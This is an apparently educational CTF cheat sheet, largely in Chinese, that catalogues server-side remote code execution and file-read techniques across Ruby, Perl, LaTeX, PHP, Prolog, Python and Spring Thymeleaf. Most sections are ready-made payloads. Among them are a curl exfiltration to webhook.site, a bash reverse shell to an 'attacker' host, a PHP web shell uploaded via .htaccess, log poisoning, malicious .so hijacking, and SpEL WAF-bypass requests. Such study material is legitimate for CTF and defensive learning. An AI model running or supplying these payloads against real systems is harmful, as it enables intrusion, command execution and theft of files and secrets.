# CTF Web - Server-Side Code Execution & Access Attacks

## Table of Contents
- [Ruby 代码注入](#ruby-code-injection)
  - [instance_eval 逃逸](#instance_eval-breakout)
  - [绕过关键字黑名单](#bypassing-keyword-blocklists)
  - [数据外传](#exfiltration)
- [通过 Ruby ObjectSpace 内存扫描提取 Flag（Tokyo Westerns 2016）](#ruby-objectspace-memory-scanning-for-flag-extraction-tokyo-westerns-2016)
- [Perl open() RCE](#perl-open-rce)
- [LaTeX 注入 RCE（Hack.lu CTF 2012）](#latex-injection-rce-hacklu-ctf-2012)
- [服务端 JS eval 黑名单绕过](#server-side-js-eval-blocklist-bypass)
- [PHP preg_replace /e 修饰符 RCE（PlaidCTF 2014）](#php-preg_replace-e-modifier-rce-plaidctf-2014)
- [字符数受限场景下的 PHP 反引号执行（EasyCTF 2017）](#php-backtick-eval-under-character-limit-easyctf-2017)
- [PHP assert() 字符串求值注入（CSAW CTF 2016）](#php-assert-string-evaluation-injection-csaw-ctf-2016)
- [Prolog 注入（PoliCTF 2015）](#prolog-injection-polictf-2015)
- [将 ReDoS 用作时间侧信道](#redos-as-timing-oracle)
- [文件上传到 RCE 技巧](#file-upload-to-rce-techniques)
  - [.htaccess 上传绕过](#htaccess-upload-bypass)
  - [PHP 日志投毒](#php-log-poisoning)
  - [Python .so 劫持（by Siunam）](#python-so-hijacking-by-siunam)
  - [Gogs 符号链接 RCE（CVE-2025-8110）](#gogs-symlink-rce-cve-2025-8110)
  - [ZipSlip + SQLi](#zipslip--sqli)
- [来自 Cookie 的 PHP 反序列化](#php-deserialization-from-cookies)
- [PHP extract() / register_globals 变量覆盖（SecuInside 2013）](#php-extract--register_globals-variable-overwrite-secuinside-2013)
- [XPath 盲注（BaltCTF 2013）](#xpath-blind-injection-baltctf-2013)
- [API 过滤器/查询参数注入](#api-filterquery-parameter-injection)
- [HTTP 响应头中的数据隐藏](#http-response-header-data-hiding)
- [WebSocket 批量赋值](#websocket-mass-assignment)
- [Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF 绕过（ApoorvCTF 2026）](#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026)
- [通过 current(getallheaders()) 绕过 PHP eval() 函数正则（RCTF 2018）](#php-eval-function-regex-bypass-via-currentgetallheaders-rctf-2018)
- [Python f-string 格式注入盲提取（Meepwn CTF Quals 2018）](#python-f-string-format-injection-blind-extraction-meepwn-ctf-quals-2018)

注入类攻击（SQLi、SSTI、SSRF、XXE、命令注入、PHP 类型混淆、PHP 文件包含）见 [server-side.md](server-side.md)。反序列化攻击（Java、Pickle）和竞争条件见 [server-side-deser.md](server-side-deser.md)。CVE 细节利用、路径遍历绕过、Flask/Werkzeug debug 与其他高级技巧见 [server-side-advanced.md](server-side-advanced.md)。

*另见：[server-side-exec-2.md](server-side-exec-2.md)，其中包含 SQLi 关键字碎片化绕过、SQL WHERE ORDER BY 绕过、通过 DNS 记录进行 SQL 注入、bash 花括号展开、Common Lisp reader macro 注入、PHP7 OPcache + LD_PRELOAD 绕过、wget 文件名技巧、tar 文件名注入、PNG/PHP polyglot 上传、编辑器备份文件泄露、`date -f` 文件读取、Apache mod_rewrite 绕过，以及 PHP ReDoS 代码跳过。*

---

## Ruby Code Injection

### instance_eval Breakout
```ruby
# Template: apply_METHOD('VALUE')
# Inject VALUE as: valid');PAYLOAD#
# Result: apply_METHOD('valid');PAYLOAD#')
```

### Bypassing Keyword Blocklists
| 被拦截 | 可替代方式 |
|---------|-------------|
| `File.read` | `Kernel#open` 或类辅助方法 |
| `File.write` | `open('path','w'){|f|f.write(data)}` |
| `system`/`exec` | `open('\|cmd')`, `%x[cmd]`, `Process.spawn` |
| `IO` | `Kernel#open` |

### Exfiltration
```ruby
open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
# Or: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
```

**关键点：** Ruby 的 `instance_eval` 和 `Kernel#open` 是常见注入 sink。若 `File`、`system`、`IO` 等关键字被拦，可改用 `open('|cmd')` 或 `Process.spawn`。Ruby 内置了很多能绕过简单黑名单的命令执行方式。

---

## Ruby ObjectSpace Memory Scanning for Flag Extraction (Tokyo Westerns 2016)

在 Ruby 沙箱题中，如果无法直接访问保存 flag 的变量，可以用 `ObjectSpace.each_object` 扫描整个堆中的字符串。

```ruby
# When you can't access the flag variable directly:
# Method 1: ObjectSpace heap scan
ObjectSpace.each_object(String) { |x| x[0..3] == "TWCT" and print x }

# Method 2: Monkey-patch to access private methods
# If object 'p' has private method 'flag':
def p.x; flag end; p.x

# Method 3: Use send() to bypass private visibility
p.send(:flag)

# Method 4: Use method() to get method object
p.method(:flag).call
```

**关键点：** `ObjectSpace.each_object(String)` 会遍历 Ruby 堆中所有仍然存活的字符串，包括私有变量和内部状态中的内容。只要已知 flag 前缀，就能把它筛出来，即使没有任何直接引用。

---

## Perl open() RCE

旧式双参数 `open()` 支持命令注入：
```perl
open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
# Exploit: "|command_here" or "command|"
```

**关键点：** Perl 的双参数 `open()` 会把文件名中的模式字符也一起解析。若输入以 `|` 开头或结尾，就会变成命令执行。任何用双参数形式打开用户可控文件名的 Perl CGI 或后端都可能直接 RCE。

---

## LaTeX Injection RCE (Hack.lu CTF 2012)

**模式：** Web 应用把用户提供的 LaTeX 编译成 PDF（论文渲染器、预览服务等），此时可借助 `\input` 的管道语法执行命令。

**读取文件：**
```latex
\begingroup\makeatletter\endlinechar=\m@ne\everyeof{\noexpand}
\edef\x{\endgroup\def\noexpand\filecontents{\@@input"/etc/passwd" }}\x
\filecontents
```

**执行命令：**
```latex
\input{|"id"}
\input{|"ls /home/"}
\input{|"cat /flag.txt"}
```

**完整独立文档负载：**
```latex
\documentclass{article}
\begin{document}
{\catcode`_=12 \ttfamily
\input{|"ls /home/user/"}
}
\end{document}
```

**关键点：** LaTeX 的 `\input{|"cmd"}` 会把 shell 命令输出直接作为文档内容读入。内部宏 `\@@input` 则能直接读文件，不走 shell。必要时可用 `\catcode` 调整特殊字符（下划线、大括号）的处理方式。

**识别方式：** 任意接受 `.tex` 输入、提供 PDF 预览/编译，或显式支持 “render LaTeX” 的功能点。

---

## Server-Side JS eval Blocklist Bypass

**通过方括号表示法中的字符串拼接绕过：**
```javascript
row['con'+'structor']['con'+'structor']('return this')()
// Also: template literals, String.fromCharCode, reverse string
```

**关键点：** 如果 JavaScript `eval` 黑名单拦截 `require`、`process`、`constructor` 等关键字，可用方括号访问配合字符串拼接绕过。`['con'+'structor']` 能拿到 `Function` 构造器，本质上等价于 `eval`，却没有出现显式关键字。

---

## PHP preg_replace /e Modifier RCE (PlaidCTF 2014)

**模式：** PHP `preg_replace()` 的 `/e` 修饰符会把 replacement 字符串当成 PHP 代码执行。若同时存在对用户可控输入的 `unserialize()`，就可以构造一个序列化对象，使其属性走到 `preg_replace("/pattern/e", "system('cmd')", ...)` 这样的危险代码路径。

```php
// Vulnerable code pattern:
preg_replace($pattern . "/e", $replacement, $input);
// If $replacement is attacker-controlled:
$replacement = 'system("cat /flag")';
```

**通过对象注入（POP 链）：**
```php
// Craft serialized object with OutputFilter containing /e pattern
$filter = new OutputFilter("/^./e", 'system("cat /flag")');
$cookie = serialize($filter);
// Send as cookie → unserialize triggers preg_replace with /e
```

**关键点：** `/e` 修饰符在 PHP 5.5 被弃用、PHP 7.0 删除，但大量旧版题目仍会出现。审计 PHP 5.x 代码时，先搜索正则里是否出现 `/e`。若又与 `unserialize()` 组合，就能通过 POP gadget 链同时控制 pattern 和 replacement，直接打成 RCE。

---

## PHP Backtick Eval Under Character Limit (EasyCTF 2017)

**模式：** PHP 反引号操作符会执行 shell 命令。若 `eval()` 输入长度受限，反引号是实现命令执行的最短写法之一。

```php
// 11-character RCE via eval()
echo`cat *`;

// 8-character directory listing
echo`ls`;

// 10-character parameterized command execution
`$_GET[0]`;

// 12-character reverse shell trigger
`$_GET[x]`;
// Then pass the full command via GET parameter: ?x=bash -i >& /dev/tcp/attacker/4444 0>&1
```

**字符数对比：**
```text
echo`cat *`;              // 12 chars - read all files
echo`ls`;                 // 9 chars  - list directory
`$_GET[0]`;               // 11 chars - parameterized execution
system('id');             // 13 chars - standard approach
exec('id');               // 11 chars - also standard
```

**关键点：** PHP 反引号等价于 `shell_exec()`。在 `eval()` 长度受限时，`` echo`cmd` `` 可以把命令执行压缩到极短。`$_GET[0]` 这种写法还能把真正 payload 挪到 URL 参数中，几乎完全绕过长度限制。

---

## PHP assert() String Evaluation Injection (CSAW CTF 2016)

PHP 的 `assert()` 会把字符串参数当成 PHP 代码执行。若用户输入被拼接进 `assert()`，就会形成代码注入。

```php
// Vulnerable code pattern:
assert("strpos('$page', '..') === false");

// Injection payload via $page parameter:
// ' and die(show_source('templates/flag.php')) or '
// Results in: assert("strpos('' and die(show_source('templates/flag.php')) or '', '..') === false");

// URL: ?page=' and die(show_source('templates/flag.php')) or '
// Alternative payloads:
// ' and die(system('cat /flag')) or '
// '.die(highlight_file('config.php')).'
```

**关键点：** PHP `assert()` 的字符串模式本质就是 `eval()`。它在 PHP 7.2 起被弃用、PHP 8.0 删除，但旧应用仍然常见。拿到源码时应优先搜 `assert()`，尤其是通过暴露的 `.git` 目录获取源码的场景。

---

## Prolog Injection (PoliCTF 2015)

**模式：** 服务把用户输入直接拼进 Prolog 谓词调用。关闭原始谓词后，追加新的 Prolog goal，即可执行命令。

```text
# Original query: hanoi(USER_INPUT)
# Injection: close hanoi(), chain exec()
3), exec(ls('/')), write('\n'
3), exec(cat('/flag')), write('\n'
```

**识别方式：** 错误信息里出现 “Prolog initialisation failed” 或 “Operator expected” 往往说明后端是 Prolog。SWI-Prolog 的 `exec/1`、`shell/1` 可以直接执行系统命令。

**关键点：** Prolog 用 `,` 连接多个 goal（逻辑与）。注入 `3), exec(cmd)` 的思路，就是先闭合原有谓词，再追加任意 goal。其本质和 SQL 注入类似，只是目标换成了逻辑编程后端。也可尝试 `process_create/3`、`read_file_to_string/3` 等替代执行/读取原语。

---

## ReDoS as Timing Oracle

**模式（0xClinic）：** 服务会拿用户给出的正则去匹配文件内容。可构造指数级回溯的正则，只在某个字符命中时触发明显延迟。

```python
def leak_char(known_prefix, position):
    for c in string.printable:
        pattern = f"^{re.escape(known_prefix + c)}(a+)+$"
        start = time.time()
        resp = requests.post(url, json={"title": pattern})
        if time.time() - start > threshold:
            return c
```

可与路径遍历结合，目标指向 `/proc/1/environ`（秘密）或 `/proc/self/cmdline`。

---

## File Upload to RCE Techniques

**关键点：** 当你能控制上传文件的扩展名（`.htaccess`、`.php`、`.so`）或上传路径（路径遍历）时，文件上传漏洞就能直接转成 RCE。被阻止直接上传代码时，应优先尝试服务端配置文件（`.htaccess`）、共享库（`.so`），或退而求其次做日志投毒。

### .htaccess Upload Bypass
1. 上传 `.htaccess`：`AddType application/x-httpd-php .lol`
2. 上传 `rce.lol`：`<?php system($_GET['cmd']); ?>`
3. 访问 `rce.lol?cmd=cat+flag.txt`

### PHP Log Poisoning
1. 在 User-Agent 头中放入 PHP payload
2. 通过路径遍历去包含：`....//....//....//var/log/apache2/access.log`

### Python .so Hijacking (by Siunam)
1. 编译：`gcc -shared -fPIC -o auth.so malicious.c`，并在其中使用 `__attribute__((constructor))`
2. 通过路径遍历上传：`{"filename": "../utils/auth.so"}`
3. 删除 `.pyc` 强制重新导入：`{"filename": "../utils/__pycache__/auth.cpython-311.pyc"}`

Reference: https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/

### Gogs Symlink RCE (CVE-2025-8110)
1. 创建仓库，执行 `ln -s .git/config malicious_link` 后推送
2. 调用 API 更新 `malicious_link`，从而覆盖 `.git/config`
3. 注入 `core.sshCommand`，拿反弹 shell

### ZipSlip + SQLi
上传带符号链接的 zip 以读文件，或结合路径遍历实现写文件。

---

## PHP Deserialization from Cookies
```php
O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
```
把 Cookie 替换为 base64 编码的恶意序列化数据。

**关键点：** 含有 base64 编码数据的 PHP Cookie 很可能会喂给 `unserialize()`。先把现有 Cookie 解码，看清类名和属性结构，再构造一个 `path` 指向 `flag.txt` 的对象，或者进一步注入 POP 链打成 RCE。

---

## PHP extract() / register_globals Variable Overwrite (SecuInside 2013)

**模式：** `extract($_GET)` 或 `extract($_POST)` 会用用户提供的键覆盖内部 PHP 变量，可用于数据库凭证注入、路径篡改或认证绕过。

```php
// Vulnerable pattern
if (!ini_get("register_globals")) extract($_GET);
// Attacker-controlled: $_BHVAR['db']['host'], $_BHVAR['path_layout'], etc.
```

```text
GET /?_BHVAR[db][host]=attacker.com&_BHVAR[db][user]=root&_BHVAR[db][pass]=pass
```

**关键点：** `extract()` 会把数组键导入当前局部变量表。可直接覆写数据库连接参数，让程序连到攻击者控制的 MySQL，再返回伪造的查询结果（文件路径、凭证等）。审计时应搜索 `extract($_GET)`、`extract($_POST)`、`extract($_REQUEST)`。PHP `register_globals`（5.4 已移除）会在全局层面制造同样的问题。

---

## XPath Blind Injection (BaltCTF 2013)

**模式：** XPath 查询由用户输入拼接而成，可通过布尔盲注或内容长度侧信道逐字提取数据。

```text
-- Injection in sort/filter parameter:
1' and substring(normalize-space(../../../node()),1,1)='a' and '2'='2

-- Boolean detection: response length > threshold = true
-- Extract character by character:
for pos in range(1, 100):
    for c in string.printable:
        payload = f"1' and substring(normalize-space(../../../node()),{pos},1)='{c}' and '2'='2"
        if len(requests.get(url, params={'sort': payload}).text) > 1050:
            result += c; break
```

**关键点：** XPath 注入和 SQL 注入很像，只是对象换成了 XML 数据。`normalize-space()` 会去掉多余空白，`../../../` 用于遍历 XML 树。若真假查询会造成响应长度差异，就能构造布尔 oracle。

---

## API Filter/Query Parameter Injection

**模式（Poacher Supply Chain）：** API 接受 JSON 过滤器。多加几个字段，就可能把内部数据一并返回。
```bash
# UI sends: filter={"region":"all"}
# Inject:   filter={"region":"all","caseId":"*"}
# May return: case_detail, notes, proof codes
```

---

## HTTP Response Header Data Hiding

证明信息或 flag 藏在自定义响应头里（如 `x-archive-tag`、`x-flag`）：
```bash
curl -sI "https://target/api/endpoint?seed=<seed>"
curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
```

**关键点：** 自定义响应头中的 flag 或 proof code（例如 `x-flag`、`x-archive-tag`）不会出现在浏览器页面渲染结果里。对 API 端点应始终检查响应头，使用 `curl -sI` 或浏览器开发者工具都可以。

---

## WebSocket Mass Assignment
```json
{"username": "user", "isAdmin": true}
```
处理器未过滤字段，即可提权。

**关键点：** 如果 WebSocket 处理器把 JSON 属性直接映射到对象上，又没有白名单过滤，就会产生 mass assignment。把 `isAdmin`、`role`、`balance` 之类的特权字段一并带上，服务端就可能直接覆写对应属性。

---

## Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)

**模式（Sugar Heist）：** 一个 Spring Boot 应用提供 Thymeleaf 模板预览端点。WAF 会拦截常见文件 I/O 类（`Runtime`、`ProcessBuilder`、`FileInputStream`），但不会拦 Spring 自带工具类。

**攻击链：**
1. **Mass assignment** 提权，把注册 JSON 中的 `"role": "ADMIN"` 一起提交
2. 通过模板预览端点触发 **SpEL 注入**
3. 使用 `org.springframework.util.FileCopyUtils` 替代被拦截类，完成 **WAF 绕过**

```bash
# Step 1: Register as admin via mass assignment
curl -X POST http://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","email":"a@b.com","role":"ADMIN"}'

# Step 2: Directory listing via SpEL (java.io.File not blocked)
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${T(java.util.Arrays).toString(new java.io.File(\"/app\").list())}"}'

# Step 3: Read flag using Spring FileCopyUtils + string concat to bypass WAF
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}'
```

**关键点：** Distroless 容器通常没有 shell（`/bin/sh`），因此即使绕过 WAF，`Runtime.exec()` 也未必有用。Spring 的 `FileCopyUtils.copyToByteArray()` 不需要起进程就能读文件。字符串拼接（`"fl"+"ag.txt"`）则可以绕过静态关键字匹配型 WAF。

**其他可用的 SpEL 文件读取载荷：**
```text
${T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream("/flag.txt"), T(java.nio.charset.StandardCharsets).UTF_8)}
${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/flag.txt")))}
```

**识别方式：** Spring Boot 应用带有 `/api/admin/preview` 一类模板渲染端点；响应中出现 Thymeleaf 错误信息；认证使用 `X-Api-Token` 头。

---

## PHP eval() Function-Regex Bypass via current(getallheaders()) (RCTF 2018)

**模式（calc）：** 某 PHP 沙箱在把用户输入传给 `eval()` 前，先用递归正则 `/[^\W_]+\((?R)?\)/` 检查字符串是否只包含一个函数调用（标识符 + 括号）。这个过滤器会拒绝下划线、数字开头标识符和多语句负载，因此像 `system($_GET[...])` 这样的直观 payload 会被杀掉。

**绕过：** `current(getallheaders())` 本身就是一个合法的单函数调用表达式，可以通过该正则。运行时它会返回首个 HTTP 头的值，也就是攻击者完全可控的字符串；随后这个字符串可被外层的 `eval` 或内层 `assert` 再次执行。

```bash
curl "http://target/?cmd=eval(current(getallheaders()));" \
     -H "Zzz: system('cat /flag');"
```

- `getallheaders()` 返回请求头组成的关联数组。
- `current()` 取出第一个元素（PHP 的 header 顺序通常足够稳定，可通过先发送恶意头或使用如 `Zzz` 这种更容易排到前面的名字来控制）。
- 外层 `eval` 会执行这个返回的字符串。

**关键点：** 只检查表达式“外形”（函数名 + 括号）的正则过滤器，很容易被“函数返回值即下一阶段 payload”这种思路击破。应重点寻找能读取攻击者可控存储的 PHP 函数，例如 `getallheaders`、`get_defined_vars`、`file_get_contents('php://input')`、`current($_SERVER)`，它们能把任意字符串偷运过语法过滤器。

**参考：** RCTF 2018 - writeup 10150

---

## Python f-string Format Injection Blind Extraction (Meepwn CTF Quals 2018)

**模式：** 某 Python 3.6+ 应用会把用户输入嵌进 f-string 模板（`f"... {user} ..."`）后执行。显式引号被过滤，因此 `{FLAG}` 虽然能返回 flag 的 `repr()`，但攻击者不能随意拼接字符串，也无法调用需要字符串参数的函数。

**绕过：布尔短路 + format spec：**
```python
# The f-string spec lets you use comparisons and arithmetic inside {}.
# `FLAG > 'c'` evaluates to True or False depending on lexicographic order.
# `True or 14` short-circuits to True; False triggers the fallback 14 which
# is then formatted as hex ('e'). This turns the template into a one-bit
# oracle that reveals 'FLAG[0] > c' per request.
payload = "{FLAG>'c' or 14:x}"
# Request returns "True" or "e" — the attacker reads one comparison bit.
```

不断调整比较字符，即可对 `FLAG` 的每个字节做二分，而无需在模板外显式输出被过滤的引号。

**关键点：** f-string 在 `{}` 中会执行完整 Python 表达式。凡是只盯着外围源码做过滤（如“不允许引号”“不允许 `__class__`”）的方案都很脆弱，因为表达式内部仍可使用现成标识符、比较运算，以及 `:x` / `:b` / `:c` 这类格式转换把结果编码成可见输出。若直接字符串操作被禁用，就改为与已有常量或其他变量比较，再逐比特读出结果。

**参考：** Meepwn CTF Quals 2018 - writeups 10433, 10434

---

*另见：[server-side.md](server-side.md)，其中涵盖核心注入攻击（SQLi、SSTI、SSRF、XXE、命令注入、PHP 类型混淆、PHP 文件包含）。*
